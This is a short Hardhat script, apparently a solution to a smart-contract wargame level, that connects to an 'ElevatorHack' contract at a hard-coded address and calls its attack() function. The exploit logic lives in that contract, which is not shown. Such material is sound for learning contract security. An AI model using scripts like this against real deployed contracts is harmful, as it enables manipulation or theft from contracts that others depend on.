const hre = require("hardhat");
const abi = require("../artifacts/contracts/ElevatorHack.sol/ElevatorHack.json");

async function main() {

    const [deployer] = await hre.ethers.getSigners();
    console.log("Attacking using MetaMask account:", deployer.address); 

    const contractAddress = "0xB5F6D4C2dE81d037c3686E2654a9DAC4507d6a11"
    const contractABI = abi.abi;
    const elevatorHack = new hre.ethers.Contract(contractAddress, contractABI, deployer);

    const result = await elevatorHack.attack();
    await result.wait();

    console.log("Attack executed, transaction hash:", result.hash);
  }

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });